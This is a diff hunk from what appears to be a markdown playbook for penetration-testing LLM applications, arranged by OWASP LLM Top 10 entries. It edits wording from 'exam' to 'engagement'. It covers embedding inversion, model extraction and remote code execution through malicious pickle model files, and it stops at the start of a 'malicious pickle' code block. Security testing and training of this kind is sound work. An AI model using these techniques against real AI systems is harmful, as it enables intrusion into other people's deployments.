@@ -46,12 +46,12 @@ Present if: you can read/dump/invert embeddings. → `/osai-embed`
 Usually a chain enabler, rarely the scored proof. Note it and chain it; don't spend time here.
 
 ### LLM10 — Unbounded Consumption
-Resource exhaustion / model extraction. Low exam value — deprioritize unless it's the objective.
+Resource exhaustion / model extraction. Low engagement value — deprioritize unless it's the objective.
 
 ## Model & supply-chain layer (LLM03 + LLM04 — deep dive)
 When you can influence an artifact the target loads (model, adapter, dataset, dependency), or read a model file, attack the model layer directly:
 
-### Pickle / model-file RCE (most common, exam-relevant)
+### Pickle / model-file RCE (most common, engagement-relevant)
 `.pkl`, `.pt`, `.bin`, `.ckpt`, legacy `.h5`, and PyTorch checkpoints deserialize code. If a target loads a model file you control:
 ```python
 # malicious pickle — code runs on torch.load / pickle.load / joblib.load
